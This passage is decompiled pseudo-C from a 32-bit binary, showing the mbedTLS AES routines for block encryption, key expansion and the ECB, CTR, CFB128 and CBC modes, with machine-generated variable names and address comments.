    v80 = *(int32_t *)(v63 + 12) ^ v87 ^ v86 ^ v85 ^ v79;
    v64 = *(int32_t *)(v63 + 16);
    v62 = *(int32_t *)(v63 + 20);
    v47 = *(char *)(v73 / 0x1000000 | 0x8083500);
    v48 = *(char *)(v80 / 256 % 256 | 0x8083500);
    v49 = *(char *)(v78 / 0x10000 % 256 | 0x8083500);
    v11 = 0x10000 * (int32_t)v49 ^ 256 * (int32_t)v48 ^ 0x1000000 * (int32_t)v47 ^ v64 ^ (int32_t)v46;
    v45 = (int32_t)*(char *)(v73 % 256 | 0x8083500) ^ v62;
    v50 = *(char *)(v80 / 0x1000000 | 0x8083500);
    v51 = *(char *)(v78 / 0x1000000 | 0x8083500);
    v81 = 0x1000000 * (int32_t)v51 ^ v45;
    v52 = *(char *)(v38 / 256 % 256 | 0x8083500);
    v53 = *(char *)(v80 % 256 | 0x8083500);
    v54 = *(char *)(v80 / 0x10000 % 256 | 0x8083500);
    v55 = *(char *)(v78 % 256 | 0x8083500);
    v65 = *(int32_t *)(v63 + 24);
    v56 = *(char *)(v73 / 256 % 256 | 0x8083500);
    v39 = v34;
    v57 = *(char *)(v39 / 0x10000 % 256 | 0x8083500);
    v31 = 0x10000 * (int32_t)v57 ^ 256 * (int32_t)v56 ^ v65 ^ (int32_t)v55 ^ 0x1000000 * (int32_t)v50;
    v66 = *(int32_t *)(v63 + 28);
    v58 = *(char *)(v39 / 0x1000000 | 0x8083500);
    v59 = *(char *)(v78 / 256 % 256 | 0x8083500);
    v60 = *(char *)(v73 / 0x10000 % 256 | 0x8083500);
    v32 = 0x10000 * (int32_t)v60 ^ 256 * (int32_t)v59 ^ 0x1000000 * (int32_t)v58 ^ v66 ^ (int32_t)v53;
    v35 = (int32_t)a3;
    *a3 = (char)v11;
    v33 = v35;
    v40 = v11;
    *(char *)(v35 + 1) = (char)(v40 / 256);
    *(char *)(v33 + 2) = (char)(v40 / 0x10000);
    *(char *)(v33 + 3) = (char)(v11 / 0x1000000);
    *(char *)(v33 + 4) = (char)v45;
    *(char *)(v33 + 5) = (char)((256 * (int32_t)v52 ^ v81) / 256);
    *(char *)(v33 + 6) = (char)((0x10000 * (int32_t)v54 ^ v62) / 0x10000);
    *(char *)(v33 + 8) = (char)v31;
    *(char *)(v33 + 12) = (char)v32;
    *(char *)(v33 + 7) = (char)(v81 / 0x1000000);
    *(char *)(v33 + 9) = (char)(v31 / 256);
    v41 = v31;
    *(char *)(v33 + 11) = (char)(v41 / 0x1000000);
    *(char *)(v33 + 13) = (char)(v32 / 256);
    v42 = v32;
    result = v42 / 0x10000;
    v67 = v42 / 0x1000000;
    g4 = v67;
    *(char *)(v33 + 10) = (char)(v41 / 0x10000);
    *(char *)(v33 + 14) = (char)result;
    *(char *)(v33 + 15) = (char)v67;
    return result;
}

// Address range: 0x804a3b6 - 0x804a3bf
int32_t function_804a3b6(int32_t a1) {
    // 0x804a3b6
    return g7;
}

// Address range: 0x804a3c0 - 0x804a3df
int32_t mbedtls_aes_init(char * a1) {
    // 0x804a3c0
    g4 = (int32_t)memset(a1, 0, 70);
    int32_t v1;
    g2 = v1;
    return 0;
}

// Address range: 0x804a3e0 - 0x804a46f
int32_t mbedtls_aes_crypt_ecb(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = g3; // 0x804a3eb
    int32_t v2 = g7; // 0x804a3f1
    g3 = a1;
    int32_t v3 = g5; // 0x804a3f7
    g7 = a3;
    g5 = a4;
    int32_t v4;
    if (g190 == 0) {
        int32_t * v5 = (int32_t *)a1;
        char * v6 = (char *)a3;
        char * v7 = (char *)a4;
        if (a2 == 1) {
            // 0x804a450
            mbedtls_aes_encrypt(v5, v6, v7);
            g3 = v1;
            g1 = 0;
            g7 = v2;
            g5 = v3;
            g2 = v4;
            return 0;
        }
        // 0x804a409
        mbedtls_aes_decrypt(v5, v6, v7);
        // branch -> 0x804a419
    } else {
        // 0x804a428
        mbedtls_padlock_xcryptecb((int32_t *)a1, a2, (int32_t *)a3, (int32_t *)a4);
        // branch -> 0x804a419
    }
    // 0x804a419
    g3 = v1;
    g1 = 0;
    g7 = v2;
    g5 = v3;
    g2 = v4;
    return 0;
}

// Address range: 0x804a470 - 0x804a4ff
int32_t mbedtls_aes_crypt_ctr(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = g5; // 0x804a473
    int32_t v2 = g7; // 0x804a474
    int32_t v3 = g3; // 0x804a475
    g7 = a4;
    int32_t v4 = *a3; // 0x804a487
    g3 = v4;
    if (a2 == 0) {
        // 0x804a4f0
        *a3 = v4;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return 0;
    }
    // 0x804a48b
    g5 = 0;
    int32_t v5 = 0; // 0x804a49313
    // branch -> 0x804a4ae
    int32_t v6;
    while (true) {
        int32_t v7 = v4; // 0x804a49d
        int32_t v8 = v5; // 0x804a4a3
        if (v4 == 0) {
            int32_t v9 = a5; // 0x804a4b5
            mbedtls_aes_crypt_ecb(a1, 1, g7, v9);
            a5 = v9;
            char * v10 = (char *)(g7 + 15); // 0x804a4d8_0
            *v10 = (char)((int32_t)*v10 + 1);
            v7 = g3;
            v8 = g5;
            // branch -> 0x804a490
        }
        char v11 = *(char *)(v8 + a6); // 0x804a493
        char v12 = *(char *)(a5 + v7); // 0x804a49a
        g3 = (v7 + 1) % 16;
        *(char *)(v8 + a7) = v12 ^ v11;
        int32_t v13 = g5 + 1; // 0x804a4a6
        g5 = v13;
        v6 = g3;
        if (v13 == a2) {
            // break -> 0x804a4f0
            break;
        }
        v5 = v13;
        v4 = v6;
        // continue -> 0x804a4ae
    }
    // 0x804a4f0
    // branch -> 0x804a4f0
    // 0x804a4f0
    *a3 = v6;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return 0;
}

// Address range: 0x804a5e0 - 0x804a6cf
int32_t mbedtls_aes_crypt_cfb128(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = g5; // 0x804a5e3
    int32_t v2 = g7; // 0x804a5e4
    int32_t v3 = g3; // 0x804a5e5
    g5 = a5;
    int32_t v4 = *a4; // 0x804a5f4
    g3 = v4;
    if (a2 == 0) {
        // 0x804a658
        if (a3 != 0) {
            // 0x804a670
            g7 = 0;
            int32_t v5 = 0; // 0x804a67e24
            // branch -> 0x804a69e
            while (true) {
                int32_t v6 = v4; // 0x804a689
                int32_t v7 = v5; // 0x804a691
                if (v4 == 0) {
                    // 0x804a6a2
                    g5 = a1;
                    mbedtls_aes_crypt_ecb(a1, 1, a5, a5);
                    v6 = g3;
                    v7 = g7;
                    // branch -> 0x804a678
                }
                unsigned char v8 = *(char *)(v7 + a6); // 0x804a67e
                int32_t v9 = v6 + a5; // 0x804a687
                g3 = (v6 + 1) % 16;
                *(char *)(v7 + a7) = *(char *)v9 ^ v8;
                g7++;
                *(char *)v9 = (char)(int32_t)v8;
                int32_t v10 = g7; // 0x804a699
                if (v10 != a3) {
                    // 0x804a678
                    v5 = v10;
                    v4 = g3;
                    // branch -> 0x804a69e
                    continue;
                }
                // 0x804a660
                *a4 = g3;
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 0;
            }
        }
        // 0x804a660
        *a4 = g3;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return 0;
    }
    // 0x804a5f8
    g7 = 0;
    if (a3 != 0) {
        int32_t v11 = 0; // 0x804a61f21
        // branch -> 0x804a632
        while (true) {
            int32_t v12 = v11; // 0x804a625
            int32_t v13 = v4; // 0x804a613
            if (v4 == 0) {
                int32_t v14 = g5; // 0x804a639
                mbedtls_aes_crypt_ecb(a1, 1, v14, v14);
                v12 = g7;
                v13 = g3;
                // branch -> 0x804a610
            }
            int32_t v15 = g5 + v13; // 0x804a613
            g3 = (v13 + 1) % 16;
            unsigned char v16 = *(char *)(v12 + a6) ^ *(char *)v15; // 0x804a61f28
            *(char *)(v12 + a7) = v16;
            g7++;
            *(char *)v15 = (char)(int32_t)v16;
            int32_t v17 = g7; // 0x804a62d
            if (v17 != a3) {
                // 0x804a610
                v11 = v17;
                v4 = g3;
                // branch -> 0x804a632
                continue;
            }
            // 0x804a660
            *a4 = g3;
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 0;
        }
    }
    // 0x804a660
    *a4 = g3;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return 0;
}

// Address range: 0x804a6d0 - 0x804a84f
int32_t mbedtls_aes_crypt_cbc(int32_t a1, int32_t a2, char a3, int32_t * a4, int32_t a5, int32_t a6) {
    int32_t v1 = g5; // 0x804a6d8
    int32_t v2 = g7; // 0x804a6d9
    int32_t v3 = g3; // 0x804a6da
    g3 = (int32_t)a4;
    int32_t v4 = a3;
    if (a3 == 15) {
        // 0x804a6eb
        int32_t v5; // 0x804a7b2
        int32_t v6; // eax
        int32_t v7;
        int32_t v8; // 0x804a71e
        int32_t v9; // 0x804a722
        int32_t v10; // 0x804a7b2
        int32_t v11; // 0x804a7bf
        int32_t v12; // 0x804a764
        int32_t v13; // 0x804a7bf
        int32_t v14; // 0x804a73f
        if (g190 != 0) {
            // 0x804a806
            if (mbedtls_padlock_xcryptcbc((int32_t *)a1, a2, v4, a4, (int32_t *)a5, (int32_t *)a6) == 0) {
                // 0x804a792
                // branch -> 0x804a794
                // 0x804a794
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 0;
            }
            // 0x804a839
            if (a2 == 0) {
                // 0x804a70e
                g5 = &v7;
                v14 = 0;
                // branch -> 0x804a718
                while (true) {
                    // 0x804a718
                    v8 = a5 - v14;
                    v9 = a6 - v14;
                    g7 = v9;
                    v7 = *(int32_t *)v8;
                    mbedtls_aes_crypt_ecb(a1, 0, 0x1000000 * v8 / 0x1000000, v9);
                    v6 = 0;
                    v12 = 0;
                    // branch -> 0x804a760
                  lab_0x804a760:
                    while (true) {
                        unsigned char v15 = *(char *)(g3 + v12); // 0x804a760
                        g4 = v15;
                        char * v16 = (char *)(g7 + v12); // 0x804a764_0
                        *v16 = *v16 ^ v15;
                        int32_t v17 = v6 + 1; // 0x804a767
                        v6 = v17;
                        if (v17 == 16) {
                            // break -> 0x804a76f
                            break;
                        }
                        v12 = v17;
                        // continue -> 0x804a760
                    }
                    // 0x804a76f
                    *(int32_t *)g3 = v7;
                    *(int32_t *)(g3 + 4) = *(int32_t *)(v8 + 4);
                    *(int32_t *)(g3 + 8) = *(int32_t *)(v8 + 8);
                    *(int32_t *)(g3 + 12) = *(int32_t *)(v8 + 12);
                    int32_t v18 = v14 - 16; // 0x804a78b
                    if (v18 + v4 == 0) {
                        // break -> 0x804a792
                        break;
                    }
                    v14 = v18;
                    // continue -> 0x804a718
                }
                // 0x804a792
                // branch -> 0x804a794
            } else {
                // 0x804a7a8
                g5 = 0;
                v10 = 0;
                // branch -> 0x804a7a8
              lab_0x804a7a8:
                while (true) {
                    // 0x804a7a8
                    v6 = 0;
                    v5 = v10 + a6;
                    g7 = v5;
                    v11 = v5;
                    v13 = 0;
                    // branch -> 0x804a7b8
                    goto lab_0x804a7b8;
                }
            }
            // 0x804a794
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 0;
        }
        // 0x804a6f8
        if (a2 != 0) {
            // 0x804a7a8
            g5 = 0;
            v10 = 0;
            // branch -> 0x804a7a8
            while (true) {
                // 0x804a7a8
                v6 = 0;
                v5 = v10 + a6;
                g7 = v5;
                v11 = v5;
                v13 = 0;
                // branch -> 0x804a7b8
              lab_0x804a7b8:
                while (true) {
                    char v19 = *(char *)(g3 + v13); // 0x804a7b8
                    char v20 = *(char *)(v13 + v10 + a5); // 0x804a7bc
                    *(char *)(v13 + v11) = v20 ^ v19;
                    int32_t v21 = v6 + 1; // 0x804a7c2
                    v6 = v21;
                    if (v21 == 16) {
                        // 0x804a7ca
                        g5 += 16;
                        int32_t v22 = g7; // 0x804a7d0
                        mbedtls_aes_crypt_ecb(a1, a2, 0x1000000 * v22 / 0x1000000, v22);
                        *(int32_t *)g3 = *(int32_t *)g7;
                        *(int32_t *)(g3 + 4) = *(int32_t *)(g7 + 4);
                        *(int32_t *)(g3 + 8) = *(int32_t *)(g7 + 8);
                        *(int32_t *)(g3 + 12) = *(int32_t *)(g7 + 12);
                        int32_t v23 = g5; // 0x804a7fd
                        if (v4 == v23) {
                            // break (via goto) -> 0x804a802
                            goto lab_0x804a802;
                        }
                        v10 = v23;
                        // continue (via goto) -> 0x804a7a8
                        goto lab_0x804a7a8;
                    } else {
                        // 0x804a7b8
                        v11 = g7;
                        v13 = v21;
                        // branch -> 0x804a7b8
                        continue;
                    }
                }
              lab_0x804a802:
                // 0x804a802
                // branch -> 0x804a794
                // 0x804a794
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 0;
            }
        }
        // 0x804a70e
        g5 = &v7;
        v14 = 0;
        // branch -> 0x804a718
        while (true) {
            // 0x804a718
            v8 = a5 - v14;
            v9 = a6 - v14;
            g7 = v9;
            v7 = *(int32_t *)v8;
            mbedtls_aes_crypt_ecb(a1, 0, 0x1000000 * v8 / 0x1000000, v9);
            v6 = 0;
            v12 = 0;
            // branch -> 0x804a760
            goto lab_0x804a760;
        }
    }
    // 0x804a794
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return -34;
}

// Address range: 0x804a850 - 0x804ab8f
int32_t mbedtls_aes_setkey_enc(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = g7; // 0x804a854
    int32_t v3 = g3; // 0x804a855
    g3 = a2;
    g7 = a3;
    int32_t v4; // 0x804a8cb
    int32_t v5; // 0x804a90c
    int32_t v6; // 0x804a946
    int32_t v7; // 0x804a9b8
    int32_t v8; // 0x804aa38
    int32_t v9; // 0x804ab10
    int32_t v10; // 0x804a991
    int32_t v11; // eax
    int32_t v12; // ebx
    int32_t v13;
    int32_t v14;
    int32_t v15; // 0x804a8b7
    int32_t v16; // 0x804a885
    int32_t v17; // 0x804a917
    int32_t v18; // 0x804a973
    uint32_t v19; // 0x804aabe
    int32_t v20; // 0x804a8e7
    uint32_t v21; // 0x804a8d1
    int32_t v22; // 0x804a9b8
    int32_t v23; // 0x804a9bb
    int32_t v24; // 0x804aa0a
    int32_t v25; // 0x804aa0e
    int32_t v26; // 0x804aa14
    int32_t v27; // 0x804aa1a
    int32_t v28; // 0x804aa38
    int32_t v29; // 0x804aa3b
    int32_t v30; // 0x804aa8a
    int32_t v31; // 0x804aa8e
    int32_t v32; // 0x804aa94
    int32_t v33; // 0x804aa9a
    int32_t v34; // 0x804aab6
    int32_t v35; // 0x804aae0
    int32_t v36; // 0x804aae5
    int32_t v37; // 0x804aaeb
    int32_t v38; // 0x804aaf1
    int32_t v39; // 0x804ab10
    int32_t v40; // 0x804ab13
    int32_t v41; // 0x804ab62
    int32_t v42; // 0x804ab66
    int32_t v43; // 0x804ab6c
    int32_t v44; // 0x804ab72
    int32_t v45; // 0x804ab78
    int32_t v46; // 0x804ab7e
    unsigned char v47; // 0x804a9ce
    unsigned char v48; // 0x804a9dc
    unsigned char v49; // 0x804a9ee
    unsigned char v50; // 0x804a9fb
    unsigned char v51; // 0x804aa4e
    unsigned char v52; // 0x804aa5c
    unsigned char v53; // 0x804aa6e
    unsigned char v54; // 0x804aa7b
    unsigned char v55; // 0x804aaa8
    unsigned char v56; // 0x804aaaf
    unsigned char v57; // 0x804aac4
    unsigned char v58; // 0x804aad1
    unsigned char v59; // 0x804ab26
    unsigned char v60; // 0x804ab34
    unsigned char v61; // 0x804ab46
    unsigned char v62; // 0x804ab53
    int32_t v63; // 0x804a909
    int32_t v64; // 0x804a8e0
    unsigned char v65; // 0x804a8fe
    uint32_t v66; // 0x804a9c5
    uint32_t v67; // 0x804aa45
    uint32_t v68; // 0x804ab1d
    int32_t v69; // 0x804a9c8
    int32_t v70; // 0x804aa07
    int32_t v71; // 0x804aa48
    int32_t v72; // 0x804aab6
    int32_t v73; // 0x804ab20
    int32_t v74; // 0x804ab5f
    int32_t v75; // 0x804a8fe
    unsigned char v76; // 0x804a8e7
    unsigned char v77; // 0x804a8ec
    unsigned char v78; // 0x804a8f1
    int32_t v79; // 0x804a9bb
    int32_t v80; // 0x804aa0e
    int32_t v81; // 0x804aa14
    int32_t v82; // 0x804aa3b
    int32_t v83; // 0x804aa8e
    int32_t v84; // 0x804aa94
    uint32_t v85; // 0x804aa9a
    int32_t v86; // 0x804aae5
    int32_t v87; // 0x804aaeb
    int32_t v88; // 0x804aaf1
    int32_t v89; // 0x804ab13
    int32_t v90; // 0x804ab66
    int32_t v91; // 0x804ab6c
    int32_t v92; // 0x804ab72
    int32_t v93; // 0x804ab78
    if (g198 == 0) {
        // 0x804a958
        aes_gen_tables();
        g198 = 1;
        if (g7 == 192) {
            // 0x804a958
            // branch -> 0x804a973
            // 0x804a973
            v18 = g190;
            *(int32_t *)v1 = 12;
            if (v18 == -1) {
                // 0x804a98a
                v10 = mbedtls_padlock_has_support(192, 0);
                g190 = v10;
                v15 = v10;
                // branch -> 0x804a8b7
            } else {
                // 0x804a973
                v15 = v18;
                // branch -> 0x804a8b7
            }
            // 0x804a8b7
            v13 = v1;
            if (v15 == 0) {
                // 0x804a940
                v6 = v13 + 8;
                v11 = v6;
                *(int32_t *)(v13 + 4) = v6;
                // branch -> 0x804a8d1
            } else {
                // 0x804a8bf
                v4 = v13 + 24 & -16;
                v11 = v4;
                *(int32_t *)(v13 + 4) = v4;
                // branch -> 0x804a8d1
            }
            // 0x804a8d1
            v21 = g7;
            if (v21 >= 32) {
                // 0x804a8db
                v63 = 0;
                v64 = 4 * v63;
                v20 = g3;
                v76 = *(char *)(v20 + 1 + v64);
                v77 = *(char *)(v20 + 2 + v64);
                v78 = *(char *)(v20 + 3 + v64);
                v75 = 4 * v63;
                v65 = *(char *)(v75 + v20);
                *(int32_t *)(v11 + v75) = (int32_t)v65 | 0x10000 * (int32_t)v77 | 256 * (int32_t)v76 | 0x1000000 * (int32_t)v78;
                v5 = 1;
                // branch -> 0x804a8e0
                while (v21 / 32 > v5) {
                    // 0x804a8e0
                    v63 = v5;
                    v64 = 4 * v63;
                    v20 = g3;
                    v76 = *(char *)(v20 + 1 + v64);
                    v77 = *(char *)(v20 + 2 + v64);
                    v78 = *(char *)(v20 + 3 + v64);
                    v75 = 4 * v63;
                    v65 = *(char *)(v75 + v20);
                    *(int32_t *)(v11 + v75) = (int32_t)v65 | 0x10000 * (int32_t)v77 | 256 * (int32_t)v76 | 0x1000000 * (int32_t)v78;
                    v5++;
                    // continue -> 0x804a8e0
                }
                // 0x804a914
                v14 = v1;
                g4 = v14;
                v17 = *(int32_t *)v14;
                if (v17 == 12) {
                    // 0x804ab08
                    v40 = 0;
                    // branch -> 0x804ab10
                    while (true) {
                        // 0x804ab10
                        v39 = v11;
                        v9 = v39 + 24;
                        v11 = v9;
                        v89 = *(int32_t *)(4 * v40 + (int32_t)&g210);
                        v12 = v40 + 1;
                        v68 = *(int32_t *)(v39 + 20);
                        v73 = *(int32_t *)v39;
                        v59 = *(char *)(v68 / 256 % 256 + (int32_t)&g199);
                        v60 = *(char *)(v68 / 0x1000000 + (int32_t)&g199);
                        v61 = *(char *)(v68 % 256 + (int32_t)&g199);
                        v62 = *(char *)(v68 / 0x10000 % 256 + (int32_t)&g199);
                        v74 = 256 * (int32_t)v62;
                        g4 = v74;
                        v41 = 0x1000000 * (int32_t)v61 ^ 0x10000 * (int32_t)v60 ^ (int32_t)v59 ^ v73 ^ v89 ^ v74;
                        *(int32_t *)v9 = v41;
                        v42 = v11;
                        v90 = *(int32_t *)(v42 - 20) ^ v41;
                        *(int32_t *)(v42 + 4) = v90;
                        v43 = v11;
                        v91 = *(int32_t *)(v43 - 16) ^ v90;
                        *(int32_t *)(v43 + 8) = v91;
                        v44 = v11;
                        v92 = *(int32_t *)(v44 - 12) ^ v91;
                        *(int32_t *)(v44 + 12) = v92;
                        v45 = v11;
                        v93 = *(int32_t *)(v45 - 8) ^ v92;
                        *(int32_t *)(v45 + 16) = v93;
                        v46 = v11;
                        *(int32_t *)(v46 + 20) = *(int32_t *)(v46 - 4) ^ v93;
                        if (v12 == 8) {
                            // 0x804ab89
                            // branch -> 0x804a936
                            // 0x804a936
                            g3 = v3;
                            g7 = v2;
                            return 0;
                        }
                      lab_0x804ab10_5:
                        // 0x804ab10
                        v40 = v12;
                        // branch -> 0x804ab10
                    }
                } else {
                    // 0x804a922
                    if (v17 != 14) {
                        // 0x804a92b
                        if (v17 == 10) {
                            // 0x804a9b0
                            v23 = 0;
                            // branch -> 0x804a9b8
                            while (true) {
                                // 0x804a9b8
                                v22 = v11;
                                v7 = v22 + 16;
                                v11 = v7;
                                v79 = *(int32_t *)(4 * v23 + (int32_t)&g210);
                                v12 = v23 + 1;
                                v66 = *(int32_t *)(v22 + 12);
                                v69 = *(int32_t *)v22;
                                v47 = *(char *)(v66 / 256 % 256 + (int32_t)&g199);
                                v48 = *(char *)(v66 / 0x1000000 + (int32_t)&g199);
                                v49 = *(char *)(v66 % 256 + (int32_t)&g199);
                                v50 = *(char *)(v66 / 0x10000 % 256 + (int32_t)&g199);
                                v70 = 256 * (int32_t)v50;
                                g4 = v70;
                                v24 = 0x1000000 * (int32_t)v49 ^ 0x10000 * (int32_t)v48 ^ (int32_t)v47 ^ v69 ^ v79 ^ v70;
                                *(int32_t *)v7 = v24;
                                v25 = v11;
                                v80 = *(int32_t *)(v25 - 12) ^ v24;
                                *(int32_t *)(v25 + 4) = v80;
                                v26 = v11;
                                v81 = *(int32_t *)(v26 - 8) ^ v80;
                                *(int32_t *)(v26 + 8) = v81;
                                v27 = v11;
                                *(int32_t *)(v27 + 12) = *(int32_t *)(v27 - 4) ^ v81;
                                if (v12 == 10) {
                                    // 0x804aa25
                                    // branch -> 0x804a936
                                    // 0x804a936
                                    g3 = v3;
                                    g7 = v2;
                                    return 0;
                                }
                              lab_0x804a9b8_5:
                                // 0x804a9b8
                                v23 = v12;
                                // branch -> 0x804a9b8
                            }
                        }
                        // 0x804a936
                        g3 = v3;
                        g7 = v2;
                        return 0;
                    }
                    // 0x804aa30
                    v29 = 0;
                    // branch -> 0x804aa38
                    while (true) {
                        // 0x804aa38
                        v28 = v11;
                        v8 = v28 + 32;
                        v11 = v8;
                        v82 = *(int32_t *)(4 * v29 + (int32_t)&g210);
                        v12 = v29 + 1;
                        v67 = *(int32_t *)(v28 + 28);
                        v71 = *(int32_t *)v28;
                        v51 = *(char *)(v67 / 256 % 256 + (int32_t)&g199);
                        v52 = *(char *)(v67 / 0x1000000 + (int32_t)&g199);
                        v53 = *(char *)(v67 % 256 + (int32_t)&g199);
                        v54 = *(char *)(v67 / 0x10000 % 256 + (int32_t)&g199);
                        v30 = 0x1000000 * (int32_t)v53 ^ 0x10000 * (int32_t)v52 ^ (int32_t)v51 ^ v71 ^ v82 ^ 256 * (int32_t)v54;
                        *(int32_t *)v8 = v30;
                        v31 = v11;
                        v83 = *(int32_t *)(v31 - 28) ^ v30;
                        *(int32_t *)(v31 + 4) = v83;
                        v32 = v11;
                        v84 = *(int32_t *)(v32 - 24) ^ v83;
                        *(int32_t *)(v32 + 8) = v84;
                        v33 = v11;
                        v85 = *(int32_t *)(v33 - 20) ^ v84;
                        *(int32_t *)(v33 + 12) = v85;
                        v55 = *(char *)(v85 / 0x1000000 | 0x8082400);
                        v56 = *(char *)(v85 % 256 | 0x8082400);
                        v34 = v11;
                        v72 = *(int32_t *)(v34 - 16);
                        v19 = v85;
                        v57 = *(char *)(v19 / 256 % 256 | 0x8082400);
                        v58 = *(char *)(v19 / 0x10000 % 256 | 0x8082400);
                        v35 = 256 * (int32_t)v57 ^ (0x1000000 * (int32_t)v55 | (int32_t)v56) ^ v72 ^ 0x10000 * (int32_t)v58;
                        *(int32_t *)(v34 + 16) = v35;
                        v36 = v11;
                        v86 = *(int32_t *)(v36 - 12) ^ v35;
                        *(int32_t *)(v36 + 20) = v86;
                        v37 = v11;
                        v87 = *(int32_t *)(v37 - 8) ^ v86;
                        *(int32_t *)(v37 + 24) = v87;
                        v38 = v11;
                        v88 = *(int32_t *)(v38 - 4) ^ v87;
                        g4 = v88;
                        *(int32_t *)(v38 + 28) = v88;
                        if (v12 == 7) {
                            // 0x804ab00
                            // branch -> 0x804a936
                            // 0x804a936
                            g3 = v3;
                            g7 = v2;
                            return 0;
                        }
                      lab_0x804aa38_5:
                        // 0x804aa38
                        v29 = v12;
                        // branch -> 0x804aa38
                    }
                }
            }
            // 0x804a914
            v14 = v1;
            g4 = v14;
            v17 = *(int32_t *)v14;
            if (v17 == 12) {
                // 0x804ab08
                v40 = 0;
                // branch -> 0x804ab10
                while (true) {
                    // 0x804ab10
                    v39 = v11;
                    v9 = v39 + 24;
                    v11 = v9;
                    v89 = *(int32_t *)(4 * v40 + (int32_t)&g210);
                    v12 = v40 + 1;
                    v68 = *(int32_t *)(v39 + 20);
                    v73 = *(int32_t *)v39;
                    v59 = *(char *)(v68 / 256 % 256 + (int32_t)&g199);
                    v60 = *(char *)(v68 / 0x1000000 + (int32_t)&g199);
                    v61 = *(char *)(v68 % 256 + (int32_t)&g199);
                    v62 = *(char *)(v68 / 0x10000 % 256 + (int32_t)&g199);
                    v74 = 256 * (int32_t)v62;
                    g4 = v74;
                    v41 = 0x1000000 * (int32_t)v61 ^ 0x10000 * (int32_t)v60 ^ (int32_t)v59 ^ v73 ^ v89 ^ v74;
                    *(int32_t *)v9 = v41;
                    v42 = v11;
                    v90 = *(int32_t *)(v42 - 20) ^ v41;
                    *(int32_t *)(v42 + 4) = v90;
                    v43 = v11;
                    v91 = *(int32_t *)(v43 - 16) ^ v90;
                    *(int32_t *)(v43 + 8) = v91;
                    v44 = v11;
                    v92 = *(int32_t *)(v44 - 12) ^ v91;
                    *(int32_t *)(v44 + 12) = v92;
                    v45 = v11;
                    v93 = *(int32_t *)(v45 - 8) ^ v92;
                    *(int32_t *)(v45 + 16) = v93;
                    v46 = v11;
                    *(int32_t *)(v46 + 20) = *(int32_t *)(v46 - 4) ^ v93;
                    if (v12 != 8) {
                        goto lab_0x804ab10_5;
                    }
                    // 0x804ab89
                    // branch -> 0x804a936
                    // 0x804a936
                    g3 = v3;
                    g7 = v2;
                    return 0;
                }
            } else {
                // 0x804a922
                if (v17 != 14) {
                    // 0x804a92b
                    if (v17 == 10) {
                        // 0x804a9b0
                        v23 = 0;
                        // branch -> 0x804a9b8
                        while (true) {
                            // 0x804a9b8
                            v22 = v11;
                            v7 = v22 + 16;
                            v11 = v7;
                            v79 = *(int32_t *)(4 * v23 + (int32_t)&g210);
                            v12 = v23 + 1;
                            v66 = *(int32_t *)(v22 + 12);
                            v69 = *(int32_t *)v22;
                            v47 = *(char *)(v66 / 256 % 256 + (int32_t)&g199);
                            v48 = *(char *)(v66 / 0x1000000 + (int32_t)&g199);
                            v49 = *(char *)(v66 % 256 + (int32_t)&g199);
                            v50 = *(char *)(v66 / 0x10000 % 256 + (int32_t)&g199);
                            v70 = 256 * (int32_t)v50;
                            g4 = v70;
                            v24 = 0x1000000 * (int32_t)v49 ^ 0x10000 * (int32_t)v48 ^ (int32_t)v47 ^ v69 ^ v79 ^ v70;
                            *(int32_t *)v7 = v24;
                            v25 = v11;
                            v80 = *(int32_t *)(v25 - 12) ^ v24;
                            *(int32_t *)(v25 + 4) = v80;
                            v26 = v11;
                            v81 = *(int32_t *)(v26 - 8) ^ v80;
                            *(int32_t *)(v26 + 8) = v81;
                            v27 = v11;
                            *(int32_t *)(v27 + 12) = *(int32_t *)(v27 - 4) ^ v81;
                            if (v12 != 10) {
                                goto lab_0x804a9b8_5;
                            }
                            // 0x804aa25
                            // branch -> 0x804a936
                            // 0x804a936
                            g3 = v3;
                            g7 = v2;
                            return 0;
                        }
                    }
                    // 0x804a936
                    g3 = v3;
                    g7 = v2;
                    return 0;
                }
                // 0x804aa30
                v29 = 0;
                // branch -> 0x804aa38
                while (true) {
                    // 0x804aa38
                    v28 = v11;
                    v8 = v28 + 32;
                    v11 = v8;
                    v82 = *(int32_t *)(4 * v29 + (int32_t)&g210);
                    v12 = v29 + 1;
                    v67 = *(int32_t *)(v28 + 28);
                    v71 = *(int32_t *)v28;
                    v51 = *(char *)(v67 / 256 % 256 + (int32_t)&g199);
                    v52 = *(char *)(v67 / 0x1000000 + (int32_t)&g199);
                    v53 = *(char *)(v67 % 256 + (int32_t)&g199);
                    v54 = *(char *)(v67 / 0x10000 % 256 + (int32_t)&g199);
                    v30 = 0x1000000 * (int32_t)v53 ^ 0x10000 * (int32_t)v52 ^ (int32_t)v51 ^ v71 ^ v82 ^ 256 * (int32_t)v54;
                    *(int32_t *)v8 = v30;
                    v31 = v11;
                    v83 = *(int32_t *)(v31 - 28) ^ v30;
                    *(int32_t *)(v31 + 4) = v83;
                    v32 = v11;
                    v84 = *(int32_t *)(v32 - 24) ^ v83;
                    *(int32_t *)(v32 + 8) = v84;
                    v33 = v11;
                    v85 = *(int32_t *)(v33 - 20) ^ v84;
                    *(int32_t *)(v33 + 12) = v85;
                    v55 = *(char *)(v85 / 0x1000000 | 0x8082400);
                    v56 = *(char *)(v85 % 256 | 0x8082400);
                    v34 = v11;
                    v72 = *(int32_t *)(v34 - 16);
                    v19 = v85;
                    v57 = *(char *)(v19 / 256 % 256 | 0x8082400);
                    v58 = *(char *)(v19 / 0x10000 % 256 | 0x8082400);
                    v35 = 256 * (int32_t)v57 ^ (0x1000000 * (int32_t)v55 | (int32_t)v56) ^ v72 ^ 0x10000 * (int32_t)v58;
                    *(int32_t *)(v34 + 16) = v35;
                    v36 = v11;
                    v86 = *(int32_t *)(v36 - 12) ^ v35;
